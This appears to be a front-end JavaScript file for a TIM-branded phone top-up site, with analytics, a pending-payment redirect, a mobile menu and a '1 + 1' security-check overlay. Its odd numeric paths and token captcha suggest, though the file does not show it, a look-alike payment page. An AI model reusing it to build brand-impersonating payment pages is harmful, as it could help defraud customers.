(function () {

    // Microsoft Clarity
    (function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "xbdwsygp4w");

    window.timNavigate = function (url) {
        window.location.href = url;
    };

    // Verifica se há pagamento pendente salvo (caso usuário fechou o browser)
    (function checkPendingPayment() {
        var raw = localStorage.getItem('tim_pending_tx');
        if (!raw) return;
        try {
            var tx = JSON.parse(raw);
            if (!tx || !tx.transaction_id) return;
            fetch('/api/check_status?id=' + encodeURIComponent(tx.transaction_id))
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    if (data.status === 'approved') {
                        localStorage.removeItem('tim_pending_tx');
                        // Restaura sessionStorage para a página de sucesso exibir os dados
                        sessionStorage.setItem('tim_transaction', JSON.stringify(tx));
                        var amt = tx.amount || 0;
                        var tid = tx.transaction_id || '';
                        window.location.href = '/pagamento/pos-pagamento.html?transaction_id=' + encodeURIComponent(tid) + '&amount=' + amt;
                    }
                })
                .catch(function() {});
        } catch(e) {}
    })();

    // Scroll-reveal
    function initReveal() {
        var els = Array.from(document.querySelectorAll('[style*="opacity: 0"]'));
        if (!('IntersectionObserver' in window)) {
            els.forEach(function (el) { el.style.opacity = '1'; el.style.transform = 'none'; });
            return;
        }
        var io = new IntersectionObserver(function (entries) {
            entries.forEach(function (entry) {
                if (!entry.isIntersecting) return;
                var el = entry.target;
                el.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
                el.style.opacity    = '1';
                el.style.transform  = 'none';
                io.unobserve(el);
            });
        }, { threshold: 0.08, rootMargin: '0px 0px -20px 0px' });
        els.forEach(function (el) { io.observe(el); });
    }

    document.readyState === 'loading'
        ? document.addEventListener('DOMContentLoaded', initReveal)
        : initReveal();

    // Menu mobile full-screen
    function initMobileMenu() {
        var btn = document.querySelector('button[aria-label="Menu"]');
        if (!btn) return;
        var nav = document.querySelector('nav.hidden.md\\:flex');
        if (!nav) return;

        var st = document.createElement('style');
        st.textContent = '#_mm-overlay{display:none}'
            + '#_mm{position:fixed;top:0;left:0;width:100%;z-index:99998;background:var(--primary,#1040a0);display:flex;flex-direction:column;transform:translateY(-100%);transition:transform .35s cubic-bezier(.4,0,.2,1);box-shadow:0 8px 32px rgba(0,0,0,0.3)}'
            + '#_mm.open{transform:translateY(0)}'
            + '#_mm-head{display:flex;align-items:center;justify-content:space-between;padding:0 16px;height:48px;flex-shrink:0;border-bottom:1px solid rgba(255,255,255,0.1)}'
            + '#_mm-logo{display:flex;align-items:center;gap:6px;font-weight:800;font-size:22px;color:#fff;text-decoration:none}'
            + '#_mm-close{background:rgba(255,255,255,0.12);border:2px solid rgba(255,255,255,0.3);color:#fff;width:36px;height:36px;border-radius:8px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:18px;line-height:1}'
            + '#_mm-links{overflow-y:auto}'
            + '#_mm-links a{display:block;padding:12px 20px;color:rgba(255,255,255,0.85);font-size:15px;font-weight:500;text-decoration:none;border-bottom:1px solid rgba(255,255,255,0.08)}'
            + '#_mm-links a:active{background:rgba(255,255,255,0.08);color:#fff}';
        document.head.appendChild(st);

        var overlay = document.createElement('div');
        overlay.id = '_mm-overlay';
        document.body.appendChild(overlay);

        var panel = document.createElement('div');
        panel.id = '_mm';

        // Header do menu
        var head = document.createElement('div');
        head.id = '_mm-head';
        head.innerHTML = '<a id="_mm-logo" href="/73653734543345/index.html"><span style="color:#e53e3e;font-size:24px;">≡</span>TIM</a>';
        var closeBtn = document.createElement('button');
        closeBtn.id = '_mm-close';
        closeBtn.innerHTML = '&#x2715;';
        head.appendChild(closeBtn);
        panel.appendChild(head);

        // Links
        var linksDiv = document.createElement('div');
        linksDiv.id = '_mm-links';
        linksDiv.innerHTML = '<div class="section-container py-4 flex flex-col gap-2">'
            + '<a class="text-sm font-medium py-2 transition-colors text-primary-foreground border-b border-primary-foreground/10 pb-3" href="/73653734543345/index.html">Início</a>'
            + '<a class="text-sm font-medium py-2 transition-colors text-primary-foreground/80 hover:text-primary-foreground border-b border-primary-foreground/10 pb-3" href="/73653734543345/recarga/index.html">Recarga</a>'
            + '<a class="text-sm font-medium py-2 transition-colors text-primary-foreground/80 hover:text-primary-foreground border-b border-primary-foreground/10 pb-3" href="/73653734543345/sobre">Sobre a TIM</a>'
            + '<a class="text-sm font-medium py-2 transition-colors text-primary-foreground/80 hover:text-primary-foreground" href="/73653734543345/contato">Contato</a>'
            + '</div>';
        panel.appendChild(linksDiv);
        document.body.appendChild(panel);

        function openMenu()  { panel.classList.add('open'); overlay.classList.add('open'); btn.setAttribute('aria-expanded','true'); }
        function closeMenu() { panel.classList.remove('open'); overlay.classList.remove('open'); btn.setAttribute('aria-expanded','false'); }

        btn.addEventListener('click', function(e) { e.stopPropagation(); panel.classList.contains('open') ? closeMenu() : openMenu(); });
        closeBtn.addEventListener('click', closeMenu);
        overlay.addEventListener('click', closeMenu);
    }

    document.readyState === 'loading'
        ? document.addEventListener('DOMContentLoaded', initMobileMenu)
        : initMobileMenu();

    // Garante o captcha de verificação em subpáginas caso o visitante entre direto nelas sem verificar antes
    function initSecurityCaptcha() {
        if (document.getElementById('sec-verify-overlay')) return;
        if (sessionStorage.getItem('tim_sec_verified') === '1') return;

        var st = document.createElement('style');
        st.textContent = '#sec-verify-overlay{position:fixed;inset:0;z-index:2147483647;background:rgba(8,18,36,0.72);backdrop-filter:blur(2px);-webkit-backdrop-filter:blur(2px);display:flex;align-items:center;justify-content:center;padding:16px;font-family:"Inter",-apple-system,BlinkMacSystemFont,sans-serif;transition:opacity 0.25s ease}'
            + '#sec-verify-card{background:#fff;width:100%;max-width:380px;border-radius:20px;padding:34px 28px 30px;box-shadow:0 24px 60px rgba(0,0,0,0.38);text-align:center;box-sizing:border-box}'
            + '#sec-verify-badge{color:#1fa672;font-size:11.5px;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;margin:0 0 10px 0}'
            + '#sec-verify-title{color:#0b192c;font-size:23px;font-weight:800;margin:0 0 8px 0;line-height:1.25}'
            + '#sec-verify-sub{color:#5b6b7f;font-size:14.5px;font-weight:400;margin:0 0 22px 0;line-height:1.4}'
            + '#sec-verify-math{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:24px}'
            + '#sec-verify-expr{color:#0b192c;font-size:29px;font-weight:800;letter-spacing:1px}'
            + '#sec-verify-eq{color:#94a3b8;font-size:22px;font-weight:500}'
            + '#sec-verify-input{width:72px;height:54px;border-radius:12px;border:2px solid #e2e2da;background:#f5f5ef;color:#0b192c;font-size:22px;font-weight:700;text-align:center;outline:none;transition:border-color 0.2s,box-shadow 0.2s;-moz-appearance:textfield}'
            + '#sec-verify-input::-webkit-outer-spin-button,#sec-verify-input::-webkit-inner-spin-button{-webkit-appearance:none;margin:0}'
            + '#sec-verify-input:focus{border-color:#f0b90b;box-shadow:0 0 0 3px rgba(240,185,11,0.22)}'
            + '#sec-verify-err{display:none;color:#dc2626;font-size:12.5px;font-weight:600;margin:-14px 0 16px 0}'
            + '#sec-verify-btn{width:100%;height:52px;border:none;border-radius:12px;background:#f0b90b;color:#111827;font-size:16.5px;font-weight:800;cursor:pointer;transition:background 0.15s,transform 0.1s}'
            + '#sec-verify-btn:hover{background:#e0ac08}'
            + '@keyframes secShake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}'
            + '.sec-shake{animation:secShake 0.25s ease-in-out 2}';
        document.head.appendChild(st);

        var overlay = document.createElement('div');
        overlay.id = 'sec-verify-overlay';
        overlay.setAttribute('role', 'dialog');
        overlay.setAttribute('aria-modal', 'true');
        overlay.innerHTML = '<div id="sec-verify-card">'
            + '<div id="sec-verify-badge">VERIFICAÇÃO DE SEGURANÇA</div>'
            + '<h2 id="sec-verify-title">Antes de continuar</h2>'
            + '<p id="sec-verify-sub">Confirme que você não é um robô.</p>'
            + '<div id="sec-verify-math">'
            + '<span id="sec-verify-expr">1 + 1</span>'
            + '<span id="sec-verify-eq">=</span>'
            + '<input id="sec-verify-input" type="number" inputmode="numeric" autocomplete="off" aria-label="Resultado de 1 mais 1" />'
            + '</div>'
            + '<div id="sec-verify-err">Resposta incorreta. Tente novamente.</div>'
            + '<button id="sec-verify-btn" type="button">Confirmar e continuar</button>'
            + '</div>';
        document.body.appendChild(overlay);
        document.body.style.overflow = 'hidden';

        var input = document.getElementById('sec-verify-input');
        var btn = document.getElementById('sec-verify-btn');
        var err = document.getElementById('sec-verify-err');
        var card = document.getElementById('sec-verify-card');

        function verify() {
            var val = (input.value || '').trim();
            if (val === '2') {
                err.style.display = 'none';
                sessionStorage.setItem('tim_sec_verified', '1');
                overlay.style.opacity = '0';
                overlay.style.pointerEvents = 'none';
                document.body.style.overflow = '';
                setTimeout(function() {
                    if (overlay && overlay.parentNode) overlay.parentNode.removeChild(overlay);
                }, 260);
            } else {
                err.style.display = 'block';
                input.style.borderColor = '#dc2626';
                card.classList.remove('sec-shake');
                void card.offsetWidth;
                card.classList.add('sec-shake');
                input.value = '';
                input.focus();
            }
        }

        btn.addEventListener('click', verify);
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                verify();
            }
        });
    }

    document.readyState === 'loading'
        ? document.addEventListener('DOMContentLoaded', initSecurityCaptcha)
        : initSecurityCaptcha();

})();
